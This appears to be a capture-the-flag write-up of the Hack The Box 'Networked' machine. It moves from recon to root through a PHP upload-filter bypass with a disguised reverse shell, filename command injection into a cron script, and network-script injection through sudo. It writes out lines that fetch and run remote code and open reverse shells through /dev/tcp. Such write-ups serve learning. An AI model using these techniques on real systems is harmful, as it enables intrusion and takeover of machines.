# Networked - `OSCP Style`

Start: 14th November 2022 - 12:48 PM

End: 15th November 2022 - 12:00PM

Setup
```console
$ export IP=10.10.10.146
```
Added `networked.htb` to `/etc/hosts`.

Initial Recon
```console
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]

$ cat nmap/initial | grep open

22/tcp  open   ssh     syn-ack      OpenSSH 7.4 (protocol 2.0)
80/tcp  open   http    syn-ack      Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

Full Port Scan
```console
$ sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

[REDACTED]
22/tcp  open   ssh     syn-ack ttl 63
80/tcp  open   http    syn-ack ttl 63
443/tcp closed https   reset ttl 63
```
443 closed..?

Information revealed by nikto scan:
```console
$ nikto -h $IP | tee nikto.scan

[REDACTED]
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ Retrieved x-powered-by header: PHP/5.4.16
+ OSVDB-3092: /backup/: This might be interesting...
```
These information might come in handy later.

Gobuster scan reveals:
```console
$ gobuster dir -u networked.htb -w /usr/share/wordlists/dirb/common.txt -t 20 -o gobuster/common.txt -x html,php,zip,txt,bak,old

[REDACTED]
/backup               (Status: 301) [Size: 236] [--> http://networked.htb/backup/]
/cgi-bin/             (Status: 403) [Size: 210]
/cgi-bin/.html        (Status: 403) [Size: 215]
/index.php            (Status: 200) [Size: 229]
/index.php            (Status: 200) [Size: 229]
/lib.php              (Status: 200) [Size: 0]
/photos.php           (Status: 200) [Size: 1302]
/upload.php           (Status: 200) [Size: 169]
/uploads              (Status: 301) [Size: 237] [--> http://networked.htb/uploads/]
```

Diving into each directory scanned previously:
```
/backup
	backup.tar

/photos.php
	Photo library with broken img links

/upload.php
	Page where we can upload files

/uploads
	Page to view the uploaded files
```

I've downloaded `backup.tar` to take a look at it.
```console
$ wget http://networked.htb/backup/backup.tar

--2022-11-14 00:07:49--  http://networked.htb/backup/backup.tar
Resolving networked.htb (networked.htb)... 10.10.10.146
Connecting to networked.htb (networked.htb)|10.10.10.146|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240 (10K) [application/x-tar]
Saving to: ‘backup.tar’

backup.tar              100%[============================>]  10.00K  --.-KB/s    in 0s      

2022-11-14 00:07:49 (40.8 MB/s) - ‘backup.tar’ saved [10240/10240]

$ mkdir backup
$ mv backup.tar backup/
$ cd backup/
$ tar -vxf backup.tar

index.php
lib.php
photos.php
upload.php
```
Looks like it is the source code for the pages hosted on the web server.

Let's take a look at `/upload.php` and `lib.php`. By looking at the source code, we can easily see how to defense mechanisms work. This also enables us to craft our payload in order to bypass all of them.
```php
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
  echo '<pre>Invalid image file.</pre>';
  displayform();
}
```
First, it checks for the file we uploaded using the `check_file_type` function, and then checks whether the size of the file is lesser then 60000. If one of them returns `false`, we are being prompted `Invalid image file.`.

Then let's look into the `check_file_type` function in `lib.php`:
```php
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  echo $mime_type;
  if (strpos($mime_type, 'image/') === 0) {
      echo "is 'image/'";
      return true;
  } else {
      return false;
  }  
}
```
Basically what this function does is to detect the mime type of the file using another function called `file_mime_type`, and then compare it with the string `image/`. If the string `image/` is at the position `0` of the mime type of our file, the function returns `true`.

For example, if the detected mime type of our uploaded file is `applicaiton/x-php`, then the function will find for the position of the string `image/` in it. Since there is no such pattern as `image/` in `application/x-php`, it will return `false`. *Read the documentation [here](https://www.php.net/manual/en/function.strpos)*.

So what does `file_mime_type` do?
```php
function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      echo $mime;
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}
```
This function ensures that the `mime type` of the uploaded file gets returned properly. If the PHP included function `finfo_file` exists, it will proceed to use its relevant library. Else, it will use the function `mime_content_type`.

*Links to the documentation of the used functions:*
- [finfo_file](https://www.php.net/manual/en/function.finfo-file)
- [finfo_open](https://www.php.net/manual/en/function.finfo-open)
- [finfo_close](https://www.php.net/manual/en/function.finfo-close)
- [is_string](https://www.php.net/manual/en/function.is-string)
- [preg_match](https://www.php.net/manual/en/function.preg-match)
- [mime_content_type](https://www.php.net/manual/en/function.mime-content-type)

Back to `upload.php` line `21`:
```php
//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
list ($foo,$ext) = getnameUpload($myFile["name"]);
$validext = array('.jpg', '.png', '.gif', '.jpeg');
$valid = false;
foreach ($validext as $vext) {
  if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
    $valid = true;
  }
}
```
Then it continues to check for the extension of the uploaded file using the `getnameUpload` function. It can only be `.jpg`, `.png`, `.gif`, or `.jpeg`.

So how does `getnameUpload` extract the extension for the uploaded file?
```php
function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}
```
By passing the `filename` variable, it gets splitted with the `.` character. For example, `test.php` becomes `['test', 'php']`. 

Then removing the first element of the array, making it the `name` variable. It also replaces all the `.` characters in `name` to `_`. For example, `1.2.3.4` becomes `1_2_3_4`.

Lastly, the left items in the `pieces` array gets merged back to a single string `ext` using the `.` character.

Here is where the vulnerability comes in. It **DOES NOT** check for multiple extensions, additional extensions gets treated as a single object. For example, `test.php.jpg` gets extracted into `$name = 'test'`, `$ext = 'php.jpg`.

*Links to the documentation of the used functions:*
+ [explode](https://www.php.net/manual/en/function.explode)
+ [array_shift](https://www.php.net/manual/en/function.array-shift)
+ [str_replace](https://www.php.net/manual/en/function.str-replace)
+ [implode](https://www.php.net/manual/en/function.implode.php)

That's all we need to know for the exploitation.

### Exploiting the vulnerabilitiy

1. Get a reverse shell from [revshell.com](https://www.revshells.com/) (I use PHP PentestMonkey's) and save it as `shell.php.jpg`.

2. Add 4 spaces at the start of the file. Insert the file signatures of `jpg` (`FF D8 FF E0`) using `hexeditor`. *Referenced [here](https://en.wikipedia.org/wiki/List_of_file_signatures)*
```console
$ hexeditor shell.php
```
After that you can verify the file type of it using:
```console
$ file shell.php

shell.php: JPEG image data
```

3. Fire up **BurpSuite** with ``intercept on``, upload the file at `/upload.php`. 

In the intercepted request, change `filename` to `shell.php.jpg` & `content-type` to `image/jpeg`. Then forward the request.

You should see the following response:
```html
<p>file uploaded, refresh gallery</p>
```

The files uploaded are at `/uploads`, but directory listing is not enabled, so we have to trigger the payload manually.

We can see the filenames of the uploads folder at `photos.php`. It seems that our uploaded file is called `10_10_14_10.php.jpg`.

Let's setup our netcat reverse shell:
```console
$ nc -lnvp 9999
listening on [any] 9999 ...
```

On the browser, navigate to `/uploads/10_10_14_10.php.jpg`.

Boom, we got a connection back:
```console
$ nc -lnvp 9999
listening on [any] 9999 ...                                                                  
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.146] 58724                                 
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:24:10 up  1:35,  0 users,  load average: 0.00, 0.01, 0.05                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                          
uid=48(apache) gid=48(apache) groups=48(apache)                                              
sh: no job control in this shell                                                             
sh-4.2$ whoami                                                                               
whoami                                                                                       
apache
```

### We are in as `apache@networked.htb`!

## `apache` to `guly`

The home directory of `guly` is readable.
```console
sh-4.2$ ls -l /home/guly

-r--r--r--. 1 root root   782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root    44 Oct 30  2018 crontab.guly
-rw-------  1 guly guly 11222 Nov 14 14:05 dead.letter
-r--------. 1 guly guly    33 Nov 14 05:49 user.txt
```
But the **user flag** is not readable for us yet.

In `/home/guly/crontab.guly`:
```console
sh-4.2$ cat crontab.guly

*/3 * * * * php /home/guly/check_attack.php
```

So there is a cronjob running at every 3 minutes. It executes `check_attack.php`:
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
Here is the part where the script is vulnerable to command injection. The entry point is the filenames under the `/var/www/html/uploads` directory.

To verify my assumption, I created a file named `` | touch hi_`whoami` ``. If the filename triggers the command, we'll be able to see a file named `hi_guly` at `/home/guly`.
```console
sh-4.2$ cd /var/www/html/uploads
sh-4.2$ echo "" > ' | touch hi_`whoami`'
```
Wait for the 3rd minute...
```console
sh-4.2$ ls -l /home/guly
-rw-r--r--  1 guly guly     0 Nov 14 12:21 hi_guly
```
We have achieved command injection! Now we have to find a way to get access to a shell as `guly`.

First, I hosted `index.html` using Python's SimpleHTTPServer module. The reason I use the name `index.html` is because we are not allowed to store `/` or `\` as filenames. It just doesn't make sense. So visiting my web server without specifying the directory will show `index.html` by default.

In `index.html`:
```
#!/bin/sh
sh -i >& /dev/tcp/10.10.14.10/8888 0>&1
```
```console
$ python2 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Now remove the previous payload for testing the code injection, the script will be stuck if we don't remove it.
```console
sh-4.2$ cd /var/www/html/uploads
sh-4.2$ rm *
```

Then we create the payload:
```console
sh-4.2$ echo "" > '`curl 10.10.14.10 -o s.sh | sh s.sh`'
```

Setup the a listener and wait for the 3rd minute to come...
```console
$ nc -lnvp 8888
listening on [any] 8888 ...
```

After 3 minutes,
```console
$ nc -lnvp 8888                                                             
listening on [any] 8888 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.146] 50294
sh: no job control in this shell
sh-4.2$ whoami
whoami
guly
bash -i
bash: no job control in this shell
[guly@networked ~]$ 
```

### We are now `guly`.

Now we have the ***user flag***.

## `guly` to `root`

The first thing I do is to check for sudo privileges.
```console
[guly@networked ~]$ sudo -l

[REDACTED]
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Looking at `/usr/local/sbin/changename.sh` doesn't shows us the vulnerability immediately. 
```sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
It has a regex limitation, we can't simply input characters to escape the command such as `;`, ``` ` ```, `|`, `&`, `>`, `<`, etc..

After **HOURS** of stucking here, I finally came across [this](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f) article. It says:
> In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space. Which means; everything after the first blank space is executed as root.

That's it! We just have to run `/usr/loca/sbin/changename.sh` as `sudo` and then fill in junk data followed by a system command.
```console
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test whoami
interface PROXY_METHOD:
test whoami
interface BROWSER_ONLY:
test whoami
interface BOOTPROTO:                                                                                                                                                                         
test whoami                                                                                                                                                                                  
root
root
root
root
root
root
root
root
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
[guly@networked ~]$ 
```

When the scripts prompts for `BOOTPROTO`, the text after the space actually gets interpreted as a command! Let's call `bash` to access a root shell.
```console
[REDACTED]

interface BOOTPROTO:
test bash
[root@networked network-scripts]#
```
There we have it.

### We are now `root`!

The ***root flag*** is at `/root/root.txt`.

### Done!
